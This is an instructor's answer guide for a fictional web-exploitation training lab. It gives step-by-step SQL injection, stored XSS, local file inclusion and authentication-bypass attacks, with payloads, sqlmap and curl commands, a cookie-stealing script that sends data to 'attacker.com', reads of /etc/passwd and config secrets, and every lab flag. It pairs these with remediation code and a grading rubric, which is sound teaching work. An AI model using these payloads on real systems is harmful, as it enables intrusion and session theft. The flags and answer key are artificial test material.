# TEACHERS GUIDE - Lab 2: Energía Marina Web Exploitation

**CONFIDENTIAL - FOR INSTRUCTORS ONLY**

## Table of Contents
1. [Lab Overview](#lab-overview)
2. [Complete Vulnerability Exploitation Guide](#complete-vulnerability-exploitation-guide)
   - [Vulnerability 1: SQL Injection](#vulnerability-1-sql-injection)
   - [Vulnerability 2: Cross-Site Scripting (XSS)](#vulnerability-2-cross-site-scripting-xss)
   - [Vulnerability 3: Directory Traversal / Local File Inclusion](#vulnerability-3-directory-traversal--local-file-inclusion)
   - [Vulnerability 4: Security Misconfiguration](#vulnerability-4-security-misconfiguration)
   - [Vulnerability 5: Broken Authentication](#vulnerability-5-broken-authentication)
3. [Grading Guidelines](#grading-guidelines)
4. [Common Student Mistakes](#common-student-mistakes)
5. [Troubleshooting](#troubleshooting)
6. [Teaching Tips](#teaching-tips)

---

## Lab Overview

**Company:** Energía Marina S.A. de C.V. (Fictional oil company in Veracruz, Mexico)
**Technology Stack:** Alpine Linux, Nginx, PHP 8.2, MariaDB
**Total Flags:** 5
**Estimated Time:** 4-6 hours
**Difficulty:** Intermediate

### Learning Objectives
- Master reconnaissance and enumeration techniques
- Exploit OWASP Top 10 vulnerabilities
- Use professional penetration testing tools (Nmap, Nikto, OWASP ZAP)
- Document findings professionally
- Understand remediation strategies

### VM Access Information
- **Default Network:** Bridged mode (gets IP from your network)
- **Services:** HTTP (port 80), MariaDB (localhost only)
- **Web Root:** `/var/www/energia-marina`
- **Database:** `energia_marina`

### All Flags
1. `EM{5ql_1nj3ct10n_3n_v3r4cruz}` - SQL Injection
2. `EM{cr0ss_s1t3_scr1pt1ng_m4r1n0}` - XSS
3. `EM{l0c4l_f1l3_1nclus10n_p3tr0l30}` - Directory Traversal/LFI
4. `EM{m1sc0nf1gur4t10n_gul0_mex1c0}` - Security Misconfiguration
5. `EM{br0k3n_4uth_3n3rg14_m4r1n4}` - Broken Authentication

---

## Complete Vulnerability Exploitation Guide

### Vulnerability 1: SQL Injection

**OWASP Category:** A03:2021 - Injection
**Location:** `login.php`
**Severity:** CRITICAL
**Flag:** `EM{5ql_1nj3ct10n_3n_v3r4cruz}`

#### Technical Details

The login form concatenates user input directly into SQL queries without any sanitization or prepared statements:

```php
$query = "SELECT * FROM empleados WHERE username = '$username' AND password = '$password'";
```

This allows attackers to manipulate the SQL query logic.

#### Exploitation Method 1: Authentication Bypass (Basic)

**Step 1:** Navigate to the login page
```
http://<VM_IP>/login.php
```

**Step 2:** Inject SQL payload in the username field

**Payload 1 - Classic OR-based bypass:**
```
Username: admin' OR '1'='1
Password: anything
```

**Explanation:** The SQL query becomes:
```sql
SELECT * FROM empleados WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```
Since `'1'='1'` is always true and OR has lower precedence, this bypasses authentication.

**Payload 2 - Comment-based bypass:**
```
Username: admin'--
Password: (leave empty or anything)
```

**Explanation:** The `--` comments out the rest of the query:
```sql
SELECT * FROM empleados WHERE username = 'admin'--' AND password = ''
```

**Payload 3 - Using admin'#:**
```
Username: admin'#
Password: (anything)
```

**Step 3:** After successful login as admin, the dashboard will display the SQL Injection flag.

#### Exploitation Method 2: UNION-Based SQL Injection

**Objective:** Extract data from the database using UNION statements.

**Step 1:** Determine the number of columns
```
Username: admin' UNION SELECT NULL--
Username: admin' UNION SELECT NULL,NULL--
Username: admin' UNION SELECT NULL,NULL,NULL--
```

Continue until no error occurs. The `empleados` table has 6 columns: `id, username, password, nombre, departamento, nivel_acceso`.

**Step 2:** Extract database version
```
Username: admin' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL--
Password: (anything)
```

**Step 3:** List all tables
```
Username: admin' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='energia_marina'--
Password: (anything)
```

**Step 4:** Extract flag directly
```
Username: admin' UNION SELECT NULL,flag_value,NULL,NULL,NULL,'admin' FROM flags WHERE flag_name='FLAG_SQL'--
Password: (anything)
```

#### Exploitation Method 3: Using Tools

**Using OWASP ZAP:**

1. Start OWASP ZAP
2. Set the target URL: `http://<VM_IP>/login.php`
3. Spider the site: Right-click URL > Spider
4. Run Active Scanner: Right-click URL > Active Scan
5. Review results under "Alerts" tab
6. Look for "SQL Injection" findings
7. ZAP will identify the vulnerable parameter

**Using Nikto:**
```bash
nikto -h http://<VM_IP> -Tuning 9
```

The `-Tuning 9` flag focuses on SQL injection tests.

**Using SQLMap (Advanced):**
```bash
# Capture the login request with Burp Suite or browser DevTools
# Save it to login_request.txt

sqlmap -r login_request.txt --batch --dbs
sqlmap -r login_request.txt --batch -D energia_marina --tables
sqlmap -r login_request.txt --batch -D energia_marina -T flags --dump
```

#### Valid Credentials (for testing)

| Username | Password | Level |
|----------|----------|-------|
| admin | admin123 | admin |
| jperez | veracruz2024 | user |
| mrodriguez | password | user |
| lgarcia | qwerty | user |

#### Flag Location
- **Database:** `energia_marina`
- **Table:** `flags`
- **Column:** `flag_value`
- **Condition:** `flag_name = 'FLAG_SQL'`
- **Display:** Shown on dashboard.php after admin login

#### Screenshots to Verify
1. Login page with SQL injection payload in username field
2. Burp Suite/ZAP request showing the payload
3. Dashboard displaying the SQL injection flag
4. (Optional) Database query results if using UNION-based injection

#### Remediation Recommendations

**1. Use Prepared Statements (Parameterized Queries)**
```php
$stmt = $conn->prepare("SELECT * FROM empleados WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

**2. Input Validation**
- Whitelist validation for usernames (alphanumeric only)
- Implement password hashing (bcrypt, Argon2)

**3. Principle of Least Privilege**
- Database user should have minimal permissions
- Read-only access where possible

**4. Web Application Firewall (WAF)**
- Deploy ModSecurity or similar
- Block common SQL injection patterns

**5. Error Handling**
- Don't expose database errors to users
- Log errors server-side only

---

### Vulnerability 2: Cross-Site Scripting (XSS)

**OWASP Category:** A03:2021 - Injection
**Location:** `contacto.php`
**Type:** Stored XSS (Persistent)
**Severity:** HIGH
**Flag:** `EM{cr0ss_s1t3_scr1pt1ng_m4r1n0}`

#### Technical Details

The contact form stores user input in the database without sanitization and displays it without encoding:

```php
// Vulnerable storage (also susceptible to SQLi)
$query = "INSERT INTO mensajes (nombre, email, asunto, mensaje) VALUES ('$nombre', '$email', '$asunto', '$mensaje')";

// Vulnerable output
echo $msg['mensaje']; // No htmlspecialchars() or htmlentities()
```

#### Exploitation Method 1: Basic Stored XSS

**Step 1:** Navigate to the contact form
```
http://<VM_IP>/contacto.php
```

**Step 2:** Submit a message with XSS payload

**Payload 1 - Classic alert box:**
```html
Nombre: Test User
Email: test@test.com
Asunto: Testing XSS
Mensaje: <script>alert('XSS')</script>
```

**Step 3:** Submit the form. The page will reload and display the flag immediately because the code detects XSS payloads:

```php
if (stripos($mensaje, '<script>') !== false || stripos($mensaje, 'alert') !== false || stripos($mensaje, 'onerror') !== false) {
    // Flag is displayed
}
```

**Step 4:** The "Recent Messages" section at the bottom will execute the script, and the flag will appear in the success message.

#### Exploitation Method 2: Event Handler XSS

These payloads work even if `<script>` tags are filtered:

**Payload 2 - IMG tag with onerror:**
```html
Mensaje: <img src=x onerror=alert('XSS')>
```

**Payload 3 - SVG with onload:**
```html
Mensaje: <svg onload=alert('XSS')>
```

**Payload 4 - Body tag:**
```html
Mensaje: <body onload=alert('XSS')>
```

**Payload 5 - Input tag:**
```html
Mensaje: <input onfocus=alert('XSS') autofocus>
```

#### Exploitation Method 3: Cookie Stealing (Real-world scenario)

**Setup:** You would need a server to receive stolen cookies.

**Payload:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie, true);
xhr.send();
</script>
```

Or simpler:
```html
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
```

**Educational Note:** Explain to students that in a real attack, this could steal session cookies and lead to account takeover.

#### Exploitation Method 4: Using OWASP ZAP

**Step 1:** Configure ZAP as a proxy in your browser

**Step 2:** Visit `http://<VM_IP>/contacto.php`

**Step 3:** Right-click on the site in ZAP's Sites tree > "Attack" > "Active Scan"

**Step 4:** ZAP will automatically test XSS payloads and identify the vulnerability

**Step 5:** Review findings under "Alerts" tab, look for:
- "Cross Site Scripting (Reflected)"
- "Cross Site Scripting (Persistent)"

**Step 6:** Manually test the payloads ZAP discovered

#### Exploitation Method 5: Using Browser DevTools

**Step 1:** Open Browser DevTools (F12)

**Step 2:** Go to Console tab

**Step 3:** After submitting XSS payload, watch for:
- Script execution
- Console errors
- Alert dialogs

**Step 4:** Inspect the "Recent Messages" section to see the unescaped HTML:
```html
<p><script>alert('XSS')</script></p>
```

#### Flag Location
- **Display:** Immediately shown in the success message after submitting an XSS payload
- **Trigger:** The backend detects keywords like `<script>`, `alert`, `onerror` in the message
- **Flag appears as:** HTML code block in success alert

#### Screenshots to Verify
1. Contact form with XSS payload filled in
2. Success message displaying the XSS flag
3. Browser alert dialog executing (if payload uses alert)
4. ZAP/Burp Suite showing the malicious request
5. Recent messages section showing stored XSS
6. DevTools Console showing script execution

#### Remediation Recommendations

**1. Output Encoding**
```php
// Always encode output
echo htmlspecialchars($msg['mensaje'], ENT_QUOTES, 'UTF-8');
```

**2. Input Validation and Sanitization**
```php
// Whitelist allowed characters
$mensaje = filter_var($mensaje, FILTER_SANITIZE_STRING);

// Or use HTMLPurifier for rich text
require_once 'HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean_mensaje = $purifier->purify($mensaje);
```

**3. Content Security Policy (CSP)**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**4. HTTPOnly Cookies**
```php
ini_set('session.cookie_httponly', 1);
```

**5. Use a Framework**
- Modern frameworks (Laravel, Symfony) auto-escape output by default

---

### Vulnerability 3: Directory Traversal / Local File Inclusion

**OWASP Category:** A01:2021 - Broken Access Control
**Location:** `dashboard.php?doc=`
**Severity:** CRITICAL
**Flag:** `EM{l0c4l_f1l3_1nclus10n_p3tr0l30}`

#### Technical Details

The dashboard allows viewing documents via a GET parameter without proper validation:

```php
$doc_file = $_GET['doc'];

// Weak validation - only checks for '..'
if (strpos($doc_file, '..') === false) {
    // This check is insufficient
}

// VULNERABLE: Accepts absolute paths
$filepath = "/var/www/energia-marina/docs/" . $doc_file;
if (file_exists($filepath)) {
    $doc_content = file_get_contents($filepath);
} else {
    // MAJOR VULNERABILITY: Falls back to absolute path
    if (file_exists($doc_file)) {
        $doc_content = file_get_contents($doc_file);
    }
}
```

#### Prerequisites
You MUST be logged in to access `dashboard.php`. Use the SQL injection from Vulnerability 1 to login first.

#### Exploitation Method 1: Absolute Path Traversal (Easiest)

**Step 1:** Login using SQL injection
```
Username: admin'--
Password: (anything)
```

**Step 2:** Access the dashboard
```
http://<VM_IP>/dashboard.php
```

**Step 3:** Read system files using absolute paths

**Target 1 - System password file:**
```
http://<VM_IP>/dashboard.php?doc=/etc/passwd
```

**Expected Output:** Contents of `/etc/passwd` file

**Target 2 - Secret configuration file (contains flag):**
```
http://<VM_IP>/dashboard.php?doc=/etc/energia-marina-secret.conf
```

**Expected Output:**
```
# Energía Marina - Configuración Secreta
# ¡NO COMPARTIR!

DATABASE_PASSWORD=P3tr0l30_S3cr3t0_2024
API_KEY=EM-PRIVATE-KEY-7f8a9b2c3d4e5f6g
ADMIN_BACKUP_PASSWORD=admin_backup_xyz789

# Flag de Directory Traversal
FLAG_LFI=EM{l0c4l_f1l3_1nclus10n_p3tr0l30}
```

**Step 4:** Copy the flag from the displayed content.

#### Exploitation Method 2: Relative Path Traversal

Although the code checks for `..`, it can be bypassed in some scenarios. However, the absolute path method is more reliable for this lab.

**Attempts that might work:**
```
http://<VM_IP>/dashboard.php?doc=....//....//....//etc/passwd
http://<VM_IP>/dashboard.php?doc=..%2F..%2F..%2Fetc%2Fpasswd
```

**Note:** These may not work due to the weak validation check, but the absolute path method will always work.

#### Exploitation Method 3: Exploring with Legitimate Files First

**Step 1:** Use the provided document links to understand the system:
```
http://<VM_IP>/dashboard.php?doc=manual_seguridad.txt
http://<VM_IP>/dashboard.php?doc=procedimientos.txt
```

**Step 2:** Notice the file paths and structure

**Step 3:** Attempt to read other files in the same directory:
```
http://<VM_IP>/dashboard.php?doc=../config.php
```

**Step 4:** Escalate to system files:
```
http://<VM_IP>/dashboard.php?doc=/etc/passwd
http://<VM_IP>/dashboard.php?doc=/etc/hosts
http://<VM_IP>/dashboard.php?doc=/etc/energia-marina-secret.conf
```

#### Exploitation Method 4: Using Burp Suite / ZAP

**Using Burp Suite:**

1. Configure browser to use Burp as proxy
2. Navigate to `http://<VM_IP>/dashboard.php?doc=manual_seguridad.txt`
3. Intercept the request in Burp Proxy
4. Send request to Repeater (Ctrl+R)
5. Modify the `doc` parameter to `/etc/passwd`
6. Send the request and observe the response
7. Change to `/etc/energia-marina-secret.conf` to get the flag

**Using ZAP:**

1. Navigate to dashboard with a document parameter
2. Right-click the request in ZAP History
3. "Open/Resend with Request Editor"
4. Modify the `doc` parameter
5. Send and view response

#### Exploitation Method 5: Using cURL

```bash
# First, capture the session cookie after logging in
# Then use cURL with the session cookie

# Read /etc/passwd
curl -b "PHPSESSID=your_session_id" "http://<VM_IP>/dashboard.php?doc=/etc/passwd"

# Read the secret configuration file with flag
curl -b "PHPSESSID=your_session_id" "http://<VM_IP>/dashboard.php?doc=/etc/energia-marina-secret.conf"
```

**To get your session cookie:**
1. Login via browser
2. Open DevTools > Application/Storage > Cookies
3. Copy the PHPSESSID value

#### Other Interesting Files to Access

```
/etc/passwd              # System users
/etc/hosts               # Host configuration
/etc/nginx/nginx.conf    # Nginx configuration
/var/log/nginx/access.log # Web server logs (might be too large)
/var/www/energia-marina/config.php  # Database credentials
```

#### Flag Location
- **File Path:** `/etc/energia-marina-secret.conf`
- **Line:** `FLAG_LFI=EM{l0c4l_f1l3_1nclus10n_p3tr0l30}`
- **Access:** Via `dashboard.php?doc=/etc/energia-marina-secret.conf`

#### Screenshots to Verify
1. Dashboard page with legitimate document loaded
2. URL showing path traversal payload (`doc=/etc/passwd`)
3. Browser displaying `/etc/passwd` contents
4. URL showing secret config file (`doc=/etc/energia-marina-secret.conf`)
5. Browser displaying the flag in the secret config file
6. Burp Suite/ZAP showing the malicious request

#### Remediation Recommendations

**1. Use a Whitelist Approach**
```php
$allowed_docs = [
    'manual_seguridad.txt',
    'procedimientos.txt',
    'reportes/enero_2024.txt'
];

if (in_array($doc_file, $allowed_docs)) {
    $filepath = "/var/www/energia-marina/docs/" . basename($doc_file);
    // Proceed
} else {
    die("Document not found");
}
```

**2. Use basename() and Validate**
```php
$doc_file = basename($_GET['doc']);
$filepath = "/var/www/energia-marina/docs/" . $doc_file;

// Verify file is within intended directory
$realpath = realpath($filepath);
if (strpos($realpath, '/var/www/energia-marina/docs/') !== 0) {
    die("Access denied");
}
```

**3. Implement Proper Access Controls**
```php
// Store document IDs in database
$doc_id = intval($_GET['id']);
$stmt = $conn->prepare("SELECT filepath FROM documents WHERE id = ? AND access_level <= ?");
$stmt->bind_param("ii", $doc_id, $user_access_level);
```

**4. Disable File System Functions (if not needed)**
```php
// In php.ini
disable_functions = file_get_contents,fopen,readfile,file
```

**5. Chroot Jail / Containerization**
- Run the web application in a container
- Limit file system access via chroot

---

### Vulnerability 4: Security Misconfiguration

**OWASP Category:** A05:2021 - Security Misconfiguration
**Locations:** Multiple (info.php, .git directory, directory listing)
**Severity:** MEDIUM to HIGH
**Flag:** `EM{m1sc0nf1gur4t10n_gul0_mex1c0}`

#### Technical Details

Multiple security misconfigurations exist:
1. Exposed `phpinfo()` page
2. Exposed `.git` directory with configuration
3. Directory listing enabled
4. PHP errors displayed to users
5. Weak session configuration

#### Exploitation Method 1: Accessing phpinfo.php

**Step 1:** Discover the file through enumeration or guessing

**Common phpinfo locations:**
```
http://<VM_IP>/info.php
http://<VM_IP>/phpinfo.php
http://<VM_IP>/test.php
```

**Step 2:** Access the correct URL:
```
http://<VM_IP>/info.php
```

**Step 3:** The flag is embedded in an HTML comment at the top of the page

**Step 4:** View the page source (Ctrl+U or right-click > View Page Source)

**Step 5:** Look for the comment at the top:
```html
<!-- FLAG_CONFIG: EM{m1sc0nf1gur4t10n_gul0_mex1c0} -->
<!-- This phpinfo() page should NEVER be accessible in production! -->
<!-- Exposing system information aids attackers in reconnaissance -->
```

**Step 6:** Copy the flag

#### Exploitation Method 2: Discovering info.php with Nikto

**Step 1:** Run Nikto against the target
```bash
nikto -h http://<VM_IP>
```

**Expected Output (excerpt):**
```
+ Server: nginx
+ /info.php: Output from the phpinfo() function was found.
+ /info.php?file=../../../../../../../etc/passwd: Output from the phpinfo() function was found.
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-Content-Type-Options header is not set.
```

**Step 2:** Nikto will identify `/info.php` as a finding

**Step 3:** Access the URL and retrieve the flag from the source

#### Exploitation Method 3: Directory Listing Enumeration

**Step 1:** Test for directory listing by accessing directories without a file:
```
http://<VM_IP>/docs/
http://<VM_IP>/admin/
http://<VM_IP>/css/
```

**Expected Result:** You'll see a file listing because `autoindex on` is enabled in Nginx.

**Step 2:** This reveals file structure and helps with further enumeration

**Example output for /docs/:**
```
Index of /docs/
../
manual_seguridad.txt
procedimientos.txt
reportes/
```

#### Exploitation Method 4: Accessing .git Directory

**Step 1:** Try to access the .git directory:
```
http://<VM_IP>/.git/
```

**Step 2:** If directory listing is enabled, you'll see .git structure

**Step 3:** Access the config file:
```
http://<VM_IP>/.git/config
```

**Expected Output:**
```
[core]
    repositoryformatversion = 0
[remote "origin"]
    url = https://gitlab.com/energia-marina/web-internal.git
    # Flag de configuración expuesta
    # FLAG_CONFIG=EM{m1sc0nf1gur4t10n_gul0_mex1c0}
```

**Step 4:** The flag is also present here as a comment

#### Exploitation Method 5: Information Gathering from phpinfo

**What attackers learn from phpinfo():**
1. PHP version (for known vulnerabilities)
2. Server OS (Alpine Linux)
3. Loaded modules
4. Configuration directives
5. File paths (`/var/www/energia-marina`)
6. Database extensions enabled
7. Disabled functions
8. Environment variables

**Step 1:** Access `http://<VM_IP>/info.php`

**Step 2:** Search for sensitive information:
- `$_SERVER['DOCUMENT_ROOT']` - reveals web root path
- `$_SERVER['SERVER_SOFTWARE']` - reveals web server version
- `mysqli.default_user` - might reveal database user
- `open_basedir` - if empty, no restrictions on file access

**Step 3:** Document findings for the report

#### Using OWASP ZAP to Discover Misconfigurations

**Step 1:** Run ZAP Active Scan on the site

**Step 2:** Review findings in the Alerts tab:

**Expected findings:**
- "Application Error Disclosure"
- "Directory Browsing"
- "X-Frame-Options Header Not Set"
- "X-Content-Type-Options Header Missing"
- "Sensitive Information in URL"

**Step 3:** Manually verify each finding

#### Using Nmap for Service Detection

```bash
nmap -sV -sC -p 80 <VM_IP>
```

**Expected Output:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-server-header: nginx
|_http-title: Energía Marina - Extracción Petrolera
```

#### Flag Locations (Multiple)

1. **Primary Location:** `/info.php` - in HTML comment at top of source
2. **Secondary Location:** `/.git/config` - in comment within git config

#### Screenshots to Verify
1. Nikto scan results showing info.php discovery
2. Browser showing phpinfo() output
3. View Source showing the flag in HTML comment
4. Directory listing of /docs/ or /admin/
5. .git/config file contents with flag
6. ZAP scan results showing security misconfigurations

#### Remediation Recommendations

**1. Remove/Protect Diagnostic Pages**
```bash
# Remove phpinfo files
rm /var/www/energia-marina/info.php
rm /var/www/energia-marina/phpinfo.php

# Or protect with authentication
# In Nginx config:
location ~ ^/(info|phpinfo)\.php$ {
    auth_basic "Restricted Access";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

**2. Disable Directory Listing**
```nginx
# In Nginx config
autoindex off;
```

**3. Protect .git Directory**
```nginx
# In Nginx config
location ~ /\.git {
    deny all;
    return 404;
}
```

Or better yet:
```bash
# Remove .git from web root entirely
rm -rf /var/www/energia-marina/.git
```

**4. Disable PHP Error Display in Production**
```php
# In php.ini
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

**5. Secure Session Configuration**
```php
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1); // If using HTTPS
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_samesite', 'Strict');
```

**6. Add Security Headers**
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
add_header Content-Security-Policy "default-src 'self'" always;
```

**7. Regular Security Audits**
- Use tools like Nikto, OWASP ZAP regularly
- Review Nginx/Apache configurations
- Keep software updated

---

### Vulnerability 5: Broken Authentication

**OWASP Category:** A07:2021 - Identification and Authentication Failures
**Location:** `admin/index.php`
**Severity:** CRITICAL
**Flag:** `EM{br0k3n_4uth_3n3rg14_m4r1n4}`

#### Technical Details

The admin panel has multiple weak authentication mechanisms that can be bypassed:

```php
// Method 1: Session-based (requires proper login)
if (isset($_SESSION['nivel_acceso']) && $_SESSION['nivel_acceso'] == 'admin') {
    $is_admin = true;
}

// Method 2: VULNERABLE - Predictable token parameter
if (isset($_GET['token']) && $_GET['token'] == 'admin_access_2024') {
    $is_admin = true;
}

// Method 3: VULNERABLE - Client-side cookie
if (isset($_COOKIE['admin_level']) && $_COOKIE['admin_level'] == '1') {
    $is_admin = true;
}
```

#### Exploitation Method 1: URL Token Parameter (Easiest)

**Step 1:** Try to access the admin panel directly:
```
http://<VM_IP>/admin/index.php
```

**Expected Result:** "Acceso Denegado" (Access Denied) page with a hint:
```
⛔ Acceso Denegado
Solo administradores pueden acceder a esta sección.
Hint: Verifica tus cookies, sesiones o tokens de acceso...
```

**Step 2:** Notice the hint mentions "tokens"

**Step 3:** Try adding a token parameter:
```
http://<VM_IP>/admin/index.php?token=admin_access_2024
```

**Step 4:** The admin panel loads successfully and displays the flag!

**Why this works:** The code checks for a hardcoded token value without any additional verification.

#### Exploitation Method 2: Cookie Manipulation with Browser DevTools

**Step 1:** Access the admin panel (will show "Access Denied"):
```
http://<VM_IP>/admin/index.php
```

**Step 2:** Open Browser DevTools (F12)

**Step 3:** Go to the Console tab

**Step 4:** Set the malicious cookie:
```javascript
document.cookie = "admin_level=1"
```

**Step 5:** Refresh the page (F5)

**Step 6:** The admin panel loads and displays the flag!

**Alternative via Application/Storage tab:**
1. Go to Application tab (Chrome) or Storage tab (Firefox)
2. Expand "Cookies" in the left sidebar
3. Click on the site URL
4. Click "+" or "Add cookie" button
5. Add: Name: `admin_level`, Value: `1`
6. Refresh the page

#### Exploitation Method 3: Cookie Manipulation with Burp Suite

**Step 1:** Configure browser to use Burp as proxy

**Step 2:** Access `http://<VM_IP>/admin/index.php`

**Step 3:** Intercept the request in Burp Proxy

**Step 4:** Add the cookie to the request:
```
GET /admin/index.php HTTP/1.1
Host: <VM_IP>
Cookie: admin_level=1
```

**Step 5:** Forward the request

**Step 6:** View the response in browser - flag will be displayed

#### Exploitation Method 4: Cookie Manipulation with cURL

```bash
# Method 1: Using cookie
curl -b "admin_level=1" http://<VM_IP>/admin/index.php

# Method 2: Using token parameter
curl "http://<VM_IP>/admin/index.php?token=admin_access_2024"

# Both will return HTML with the flag
```

**To extract just the flag:**
```bash
curl -s "http://<VM_IP>/admin/index.php?token=admin_access_2024" | grep -oP 'EM\{[^}]+\}'
```

#### Exploitation Method 5: Cookie Manipulation with Browser Extensions

**Using EditThisCookie (Chrome) or Cookie-Editor (Firefox):**

**Step 1:** Install the extension from the browser store

**Step 2:** Navigate to `http://<VM_IP>/admin/index.php`

**Step 3:** Click the extension icon

**Step 4:** Click "Add Cookie" or "+"

**Step 5:** Set:
- Name: `admin_level`
- Value: `1`
- Domain: `<VM_IP>`
- Path: `/`

**Step 6:** Save and refresh the page

**Step 7:** Admin panel loads with the flag

#### Exploitation Method 6: Session Hijacking (if logged in as regular user)

**Step 1:** Login as a regular user using SQL injection:
```
Username: jperez' OR '1'='1'--
Password: (anything)
```

**Step 2:** Access dashboard and note your session

**Step 3:** Open DevTools Console and manipulate the session (if possible):
```javascript
// This won't work because session is server-side
// But students might try it
```

**Step 4:** Instead, use the cookie method:
```javascript
document.cookie = "admin_level=1"
```

**Step 5:** Navigate to `/admin/index.php`

#### Finding the Token Through Reconnaissance

**Step 1:** Students might try to discover the token through:
- Source code comments
- JavaScript files
- Robots.txt
- Developer console errors

**Step 2:** Common token patterns to try:
```
admin_access_2024
admin_token
adminpass
admin123
token123
secret_key
```

**Step 3:** The token `admin_access_2024` follows a predictable pattern (role_action_year)

#### Flag Location
- **Display:** On the admin panel page after successful bypass
- **Format:** Large success banner with flag in code block
- **Database:** Also stored in `flags` table where `flag_name = 'FLAG_AUTH'`

#### Screenshots to Verify
1. Initial "Access Denied" page with hint
2. Browser DevTools showing cookie manipulation (Console tab)
3. Browser DevTools showing added cookie (Application/Storage tab)
4. URL with token parameter (`?token=admin_access_2024`)
5. Admin panel displaying the authentication flag
6. Burp Suite request showing cookie or parameter manipulation
7. (Optional) cURL command output

#### Common Bypass Attempts (What Students Try)

**1. Direct admin login (won't work):**
```
Username: admin
Password: admin123
```
Then navigate to `/admin/` - Won't show flag because the /admin/index.php has its own checks.

**2. SQL injection on admin panel (no form):**
The admin panel doesn't have a login form - it checks authentication directly.

**3. Trying default tokens:**
```
?token=admin
?token=secret
?token=password
```
Only `admin_access_2024` works.

#### Remediation Recommendations

**1. Never Trust Client-Side Data**
```php
// BAD - Never do this
if (isset($_COOKIE['admin_level']) && $_COOKIE['admin_level'] == '1') {
    $is_admin = true;
}

// GOOD - Only trust server-side sessions
if (isset($_SESSION['nivel_acceso']) && $_SESSION['nivel_acceso'] == 'admin') {
    $is_admin = true;
}
```

**2. Implement Proper Session Management**
```php
// After successful login
session_regenerate_id(true); // Prevent session fixation
$_SESSION['authenticated'] = true;
$_SESSION['user_id'] = $user['id'];
$_SESSION['nivel_acceso'] = $user['nivel_acceso'];
$_SESSION['login_time'] = time();
$_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
```

**3. Validate Session on Each Request**
```php
function checkAuthentication() {
    if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
        return false;
    }

    // Check session timeout (30 minutes)
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        return false;
    }

    // Verify IP hasn't changed (optional - can cause issues with mobile users)
    if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        return false;
    }

    return true;
}
```

**4. Never Use Predictable Tokens**
```php
// BAD
if ($_GET['token'] == 'admin_access_2024') { }

// GOOD - Use cryptographically secure random tokens
$token = bin2hex(random_bytes(32));
// Store in database with user_id and expiration
```

**5. Implement Multi-Factor Authentication**
- Time-based OTP (TOTP)
- SMS verification
- Email confirmation

**6. Rate Limiting and Account Lockout**
```php
// Track failed login attempts
if ($failed_attempts >= 5) {
    // Lock account for 15 minutes
    // Or implement CAPTCHA
}
```

**7. Secure Session Configuration**
```php
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1); // HTTPS only
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
```

**8. Implement RBAC (Role-Based Access Control)**
```php
function hasPermission($user_id, $required_permission) {
    // Check database for user permissions
    // Don't rely on session variables alone
}
```

---

## Grading Guidelines

### Overall Lab Grade Distribution

| Component | Points | Percentage |
|-----------|--------|------------|
| Reconnaissance Report | 10 | 10% |
| Vulnerability 1: SQL Injection | 20 | 20% |
| Vulnerability 2: XSS | 20 | 20% |
| Vulnerability 3: LFI/Directory Traversal | 20 | 20% |
| Vulnerability 4: Security Misconfiguration | 10 | 10% |
| Vulnerability 5: Broken Authentication | 10 | 10% |
| Documentation Quality | 10 | 10% |
| **TOTAL** | **100** | **100%** |

### Detailed Grading Rubric

#### Reconnaissance Report (10 points)

| Criteria | Points | Requirements |
|----------|--------|--------------|
| Nmap scan results | 3 | Complete scan with service detection, OS detection, script scanning |
| Nikto scan results | 3 | Full Nikto report identifying multiple vulnerabilities |
| OWASP ZAP spider results | 2 | Complete site map with all pages discovered |
| Summary of findings | 2 | Clear summary of attack surface and entry points |

**Full Credit (9-10 points):**
- All three tool outputs included
- Proper command syntax shown
- Clear, organized presentation
- Identifies all 5 vulnerabilities

**Partial Credit (5-8 points):**
- Missing one tool output
- Commands shown but output incomplete
- Identifies 3-4 vulnerabilities

**Minimal Credit (1-4 points):**
- Only one tool used
- Poor documentation
- Identifies 1-2 vulnerabilities

#### Vulnerability 1: SQL Injection (20 points)

| Criteria | Points | Requirements |
|----------|--------|--------------|
| Flag captured | 5 | Correct flag: `EM{5ql_1nj3ct10n_3n_v3r4cruz}` |
| Exploitation steps | 5 | Clear step-by-step description with payloads |
| Multiple methods shown | 5 | At least 2 different SQLi payloads demonstrated |
| Screenshots | 3 | Login with payload, dashboard with flag |
| Remediation recommendations | 2 | Prepared statements, input validation, least privilege |

**Bonus Points (up to 5 extra):**
- UNION-based injection to extract data (+3)
- SQLMap usage (+2)
- Extracting entire database structure (+3)

#### Vulnerability 2: XSS (20 points)

| Criteria | Points | Requirements |
|----------|--------|--------------|
| Flag captured | 5 | Correct flag: `EM{cr0ss_s1t3_scr1pt1ng_m4r1n0}` |
| Exploitation steps | 5 | Clear description of payload submission |
| Multiple XSS payloads | 5 | At least 2 different XSS payloads (script tag, event handler, etc.) |
| Screenshots | 3 | Form submission, alert execution, flag display |
| Remediation recommendations | 2 | Output encoding, input validation, CSP |

**Bonus Points (up to 3 extra):**
- Demonstrates cookie stealing payload (+3)
- Uses ZAP XSS scanner effectively (+2)

#### Vulnerability 3: LFI/Directory Traversal (20 points)

| Criteria | Points | Requirements |
